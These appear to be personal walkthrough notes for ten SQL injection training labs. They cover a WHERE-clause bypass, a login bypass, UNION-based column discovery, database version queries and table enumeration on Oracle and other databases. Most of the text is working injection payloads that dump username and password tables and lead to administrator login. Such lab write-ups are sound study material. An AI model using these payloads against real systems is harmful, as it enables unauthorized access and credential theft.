# Labs

## SQL injection

1. [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
2. [SQL injection vulnerability allowing login bypass](#sql-injection-vulnerability-allowing-login-bypass)
3. [SQL injection UNION attack, determining the number of columns returned by the query](#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
4. [SQL injection UNION attack, finding a column containing text](#sql-injection-union-attack-finding-a-column-containing-text)
5. [SQL injection UNION attack, retrieving data from other tables](#sql-injection-union-attack-retrieving-data-from-other-tables)
6. [SQL injection UNION attack, retrieving multiple values in a single column](#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)
7. [SQL injection attack, querying the database type and version on Oracle](#sql-injection-attack-querying-the-database-type-and-version-on-oracle)
8. [SQL injection attack, querying the database type and version on MySQL and Microsoft](#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft)
9. [SQL injection attack, listing the database contents on non-Oracle databases](#sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
10. [SQL injection attack, listing the database contents on Oracle](#sql-injection-attack-listing-the-database-contents-on-oracle)

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```text
URL - /filter?category=Gifts

Required - SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Query - Gifts' OR 1=1--
```

### SQL injection vulnerability allowing login bypass

```text
Navigate to my account

In login page,
username - administrator'--

Commenting out the query after username
```

### SQL injection UNION attack, determining the number of columns returned by the query

```text
Select any category filter

Start by query - Pets' UNION SELECT NULL--

Keep appending NULL until no error

Required query - Pets' UNION SELECT NULL,NULL,NULL--
```

### SQL injection UNION attack, finding a column containing text

```text
Under category filter,

first we have to find number of columns

required query - Gifts' UNION SELECT NULL,NULL,NULL--

Now, we need to find which column contains text

Start replacing each NULL by a string

required query - Gifts' UNION SELECT NULL,'a',NULL--

replace 'a' with string to be outputted
```

### SQL injection UNION attack, retrieving data from other tables

```text
Under category filter,

We need to find username, password from users table

Required query - Gifts' UNION SELECT username,password FROM users--

This gives us administrator's password, then we just need to login
```

### SQL injection UNION attack, retrieving multiple values in a single column

```text
Under category filter,

First find number of columns required

Required query - Gifts' ORDER BY 3--

As this query gives us an error, we know only 2 columns are used

Next, we need to find which column supports text

Start with query - Gifts' UNION SELECT NULL,NULL--

Required query - Gifts' UNION SELECT NULL,'a'--

Now, we need to get username and password in single column

Required query - Gifts' UNION SELECT NULL,username||'~'||password FROM users--

This gives us password for logging in.
```

### SQL injection attack, querying the database type and version on Oracle

```text
As we are in a Oracle database, we need to use payloads aptly

We need to use 'FROM' in every Oracle query, so we can use 'dual' table

First, finding number of columns

Required query - Gifts' UNION SELECT NULL,NULL FROM dual--

Now, finding which column is of string type

Required query - Gifts' UNION SELECT 'a','a' FROM dual--

Both columns support text type so we can use any one of them to print version data

Using 'SELECT banner FROM v$version' payload,

Required query - Gifts' UNION SELECT 'a',banner FROM v$version--
```

### SQL injection attack, querying the database type and version on MySQL and Microsoft

```text
Select the category filter

We can use Burp Suite to capture the request, forward it to Repeater as we will have multiple modifications

Initially, we need to find number of columns

Required query - Pets' UNION SELECT NULL,NULL#

Here, we need to URL-encode the queries otherwise they won't work

Next, we need to find data-type of columns

Required query - Pets' UNION SELECT 'a','a'#

Finally, we need to query version type.

Do URL-encode the queries in Burp Suite.

Required query - ' UNION SELECT @@version,NULL#
```

### SQL injection attack, listing the database contents on non-Oracle databases

```text
First, find number of columns

Payload - Pets' ORDER BY 1--

Starting from 1, we increment it until it gives error (at 3). So we know that there are 2 columns

Confirm this using another payload.

Payload - Pets' UNION SELECT NULL,NULL--

Now, we need to confirm datatypes of columns

Payload - Pets' UNION SELECT 'a','a'--

Now, we need to list contents of database

Payload - Pets' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--

This outputs a lot of tables, but we need to find the one with usernames and passwords

After that, we need to find the required columns

Payload - Pets' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_pegreq'--

This gives the two required column names for table.
Now, we need to output the content of those two columns

Required payload - Pets' UNION SELECT username_njreoo,password_srfoyr FROM users_pegreq--

This gives the password for administrator, which can be used to login
```

### SQL injection attack, listing the database contents on Oracle

```text
Select any category filter; we need to find the number of columns.

We can intercept the request and send it to Repeater in Burp Suite for convenience.

(All payloads have to be sent URL-encoded)
Payload - Pets' ORDER BY 1--

Starting from 1, increment it until it gives error - here we get Internal Server error at 3.

So, there are 2 columns - we need to find the datatypes of these columns.

As it is an Oracle database, we need to use 'FROM' with 'UNION', so we can use a dummy table like 'dual'

Payload - Pets' UNION SELECT 'a','a' FROM dual--

This does not give us an error, so we can attempt to list contents of the database.

Payload - Pets' UNION SELECT TABLE_NAME,NULL FROM all_tables--

Now, we have the table 'USERS_FIORQD', but we do not have column names.
Following the Oracle format, we need to print the column names for this table.

Payload - Pets' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_FIORQD'--

This gives us the two column names we require for users and passwords; we can now print the contents of these two columns.

Payload - Pets' UNION SELECT PASSWORD_CHMJXC,USERNAME_HJDKPR FROM USERS_FIORQD--

This gives the password for 'administrator' - use it to login.
```
